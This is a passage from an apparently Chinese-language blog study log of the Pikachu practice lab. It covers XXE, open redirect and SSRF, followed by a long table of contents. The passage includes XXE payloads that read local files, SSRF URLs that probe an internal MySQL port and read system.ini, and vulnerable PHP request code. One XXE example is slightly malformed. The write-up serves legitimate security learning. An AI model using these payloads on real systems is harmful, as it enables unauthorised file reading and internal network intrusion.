Definition),全称为文档类型定义，是XML文档中的一部分，用来定义元素, <strong>对xml文档定义语义约束</strong>。</li>\n</ul>\n<h4 id=\"XML结构\"><a href=\"#XML结构\" class=\"headerlink\" title=\"XML结构\"></a>XML结构</h4><div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!--第一部分: XML声明--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #F07178\">xml</span><span style=\"color: #C792EA\"> version</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">1.0</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">?&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!--第二部分: 文档类型定义DTD--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">note</span><span style=\"color: #89DDFF\"> [ </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">ENTITY</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">entity-name</span><span style=\"color: #F78C6C\"> SYSTEM </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">URL/URL</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\"> &gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">]&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!--第三部分: 文档元素--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">to</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">123</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">to</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">from</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">abc</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">from</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">head</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">xyz</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">head</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">body</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">hhhh</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">body</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div><h4 id=\"外部实体引用payload\"><a href=\"#外部实体引用payload\" class=\"headerlink\" title=\"外部实体引用payload\"></a>外部实体引用payload</h4><div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #F07178\">xml</span><span style=\"color: #C792EA\"> version</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">1.0</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C792EA\"> encoding</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">UTF-8</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\"> ?&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">ANY</span><span style=\"color: #89DDFF\"> [ </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">ENTITY</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">SYSTEM</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">file:///flag</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\"> &gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">x</span><span style=\"color: #89DDFF\">&gt;&amp;</span><span style=\"color: #BABED8\">f</span><span style=\"color: #89DDFF\">;&lt;/</span><span style=\"color: #F07178\">x</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div><h3 id=\"Pikachu关卡-12\"><a href=\"#Pikachu关卡-12\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><ul>\n<li><p>payload:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&lt;!DOCTYPE ANY [</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    &lt;!ENTITY f SYSTEM &quot;file:///Windows/system.ini&quot;&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&lt;x&gt;&amp;f;&lt;/x&gt;</span></span></code></pre></div></li>\n<li><p>可以读取任意文件<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20195858.png?raw=\"></p>\n</li>\n</ul>\n<h2 id=\"不安全的url跳转\"><a href=\"#不安全的url跳转\" class=\"headerlink\" title=\"不安全的url跳转\"></a>不安全的url跳转</h2><h3 id=\"概述-13\"><a href=\"#概述-13\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话, 就可能发生”跳错对象”的问题。</li>\n<li>危害: 钓鱼</li>\n</ul>\n<h3 id=\"Pikachu关卡-13\"><a href=\"#Pikachu关卡-13\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><ul>\n<li>点击第三句话时会进行一个跳转, 正确的跳转应该是转到概述页面, 发现网页通过参数<code>url</code>确定跳转目标<br><code>http://192.168.5.146:7090/vul/urlredirect/urlredirect.php?url=unsafere.php</code></li>\n<li>这里参数url可以改成任意url, 比如<code>url=https://google.com</code>, 可跳转到对应网页, 可用于钓鱼攻击</li>\n</ul>\n<h2 id=\"SSRF-服务端请求伪造\"><a href=\"#SSRF-服务端请求伪造\" class=\"headerlink\" title=\"SSRF-服务端请求伪造\"></a>SSRF-服务端请求伪造</h2><h3 id=\"概述-14\"><a href=\"#概述-14\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li><p>服务端提供了<strong>从其他服务器应用</strong>获取数据的功能且没有对目标地址做过滤与限制</p>\n</li>\n<li><p>数据流: 攻击者–&gt;服务器–&gt;目标地址</p>\n</li>\n</ul>\n<h4 id=\"产生SSRF漏洞的函数\"><a href=\"#产生SSRF漏洞的函数\" class=\"headerlink\" title=\"产生SSRF漏洞的函数\"></a>产生SSRF漏洞的函数</h4><ul>\n<li><p><strong>file_get_contents</strong></p>\n<p>  从指定url读取文件:</p>\n<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">content </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">file_get_contents</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">_POST</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]);</span><span style=\"color: #BABED8\"> </span></span></code></pre></div></li>\n<li><p><strong>fsockopen</strong></p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span></span></code></pre></div></li>\n<li><p><strong>curl_exec</strong></p>\n<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">link </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">_POST</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">curlobj </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">curl_init</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">curl_setopt</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">curlobj</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> CURLOPT_POST</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">curl_setopt</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">curlobj</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\">CURLOPT_URL</span><span style=\"color: #89DDFF\">,$</span><span style=\"color: #BABED8\">link</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">curl_setopt</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">curlobj</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> CURLOPT_RETURNTRANSFER</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">result</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">curl_exec</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">curlobj</span><span style=\"color: #89DDFF\">);</span></span></code></pre></div></li>\n</ul>\n<p><em><strong>还可以使用伪协议</strong></em></p>\n<h3 id=\"Pikachu关卡-14\"><a href=\"#Pikachu关卡-14\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><ul>\n<li><p>使用了<code>curl_exec()</code>函数发送请求, 可以用来探测内网信息, 比如探测3306端口:<code>http://192.168.5.146:7090/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306</code></p>\n<p><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20203750.png?raw=\"></p>\n</li>\n<li><p>利用file协议读取任意服务器文件:<code>http://192.168.5.146:7090/vul/ssrf/ssrf_c</code><br><code>url.php?url=file:///C:/Windows/system.ini</code></p>\n<p><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20204301.png?raw=\"></p>\n</li>\n<li><p>利用dict协议扫描内网主机开放端口:<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20204540.png?raw=\"></p>\n</li>\n</ul>\n","text":"Pikachu靶场实操暴力破解概述连续性尝试+字典+自动化 字典 常用的账号密码 社工库 算法生成 暴力破解漏洞 是否要求复杂密码 是否使用安全的验证码 是否进...","permalink":"/post/Pikachu靶场实操","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":21,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":21,"path":"api/tags/学习日志.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Pikachu%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D\"><span class=\"toc-text\">Pikachu靶场实操</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">暴力破解</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0\"><span class=\"toc-text\">概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AD%97%E5%85%B8\"><span class=\"toc-text\">字典</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">暴力破解漏洞</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%AA%8C%E8%AF%81%E7%A0%81\"><span class=\"toc-text\">验证码</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">测试流程</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1\"><span class=\"toc-text\">Pikachu关卡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">基于表单的暴力破解</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server\"><span class=\"toc-text\">验证码绕过(on server)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client\"><span class=\"toc-text\">验证码绕过(on client)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#token%E9%98%B2%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">token防爆破</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">XSS跨站脚本</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-1\"><span class=\"toc-text\">概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B-1\"><span class=\"toc-text\">测试流程</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#tips\"><span class=\"toc-text\">tips</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-GET%E4%B8%8EPOST\"><span class=\"toc-text\">反射型xss(GET与POST)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#XSS%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">XSS绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#htmlspecialchars-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">htmlspecialchars()函数</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-1\"><span class=\"toc-text\">Pikachu关卡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get\"><span class=\"toc-text\">反射型xss(get)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-post\"><span class=\"toc-text\">反射型xss(post)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AD%98%E5%82%A8%E5%9E%8Bxss\"><span class=\"toc-text\">存储型xss</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#DOM%E5%9E%8Bxss\"><span class=\"toc-text\">DOM型xss</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#DOM%E5%9E%8Bxss-x\"><span class=\"toc-text\">DOM型xss-x</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#xss%E4%B9%8B%E7%9B%B2%E6%89%93\"><span class=\"toc-text\">xss之盲打</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#xss%E4%B9%8B%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">xss之过滤</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#xss%E4%B9%8Bhtmlspecialchars\"><span class=\"toc-text\">xss之htmlspecialchars</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#xss%E4%B9%8Bherf%E8%BE%93%E5%87%BA\"><span class=\"toc-text\">xss之herf输出</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA\"><span class=\"toc-text\">xss之js输出</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">CSRF(跨站请求伪造)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-2\"><span class=\"toc-text\">概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%8EXSS%E7%9A%84%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">与XSS的区别</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%A1%AE%E8%AE%A4%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">确认是否存在CSRF漏洞</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Token%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CDRF\"><span class=\"toc-text\">Token如何防止CDRF</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-2\"><span class=\"toc-text\">Pikachu关卡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#CSRF-get\"><span class=\"toc-text\">CSRF(get)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#CSRF-post\"><span class=\"toc-text\">CSRF(post)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#CSRF-Token\"><span class=\"toc-text\">CSRF Token</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SQL注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-3\"><span class=\"toc-text\">概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">攻击流程</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">注入点类型</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8Eunion%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">基于union联合查询的信息获取</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0\"><span class=\"toc-text\">判断查询列数</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">基于报错信息获取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">报错函数</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">盲注</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">宽字节注入</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-3\"><span class=\"toc-text\">Pikachu关卡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-post\"><span class=\"toc-text\">数字型注入(post)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-get\"><span class=\"toc-text\">字符型注入(get)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">搜索型注入</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#xx%E5%9E%8B%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">xx型注入</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E2%80%9Cinsert-update%E2%80%9D%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">“insert&#x2F;update”注入</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E2%80%9Cdelete%E6%B3%A8%E5%85%A5%E2%80%9D\"><span class=\"toc-text\">“delete注入”</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E2%80%9Chttp-header%E2%80%9D%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">“http header”注入</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9B%B2%E6%B3%A8-base-on-boolean\"><span class=\"toc-text\">盲注(base on boolean)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9B%B2%E6%B3%A8-base-on-time\"><span class=\"toc-text\">盲注(base on time)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-1\"><span class=\"toc-text\">宽字节注入</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">越权漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-4\"><span class=\"toc-text\">概述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-4\"><span class=\"toc-text\">Pikachu关卡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83\"><span class=\"toc-text\">水平越权</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83\"><span class=\"toc-text\">垂直越权</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#RCE-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">RCE-命令执行漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-5\"><span class=\"toc-text\">概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">远程系统命令执行</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-5\"><span class=\"toc-text\">Pikachu关卡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ping-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">ping-远程系统命令执行</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#eval-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">eval-远程代码执行</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">文件包含漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-6\"><span class=\"toc-text\">概述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-6\"><span class=\"toc-text\">Pikachu关卡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">本地文件包含</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">远程文件包含</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">不安全的文件下载</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-7\"><span class=\"toc-text\">概述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-7\"><span class=\"toc-text\">Pikachu关卡</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">文件上传漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" 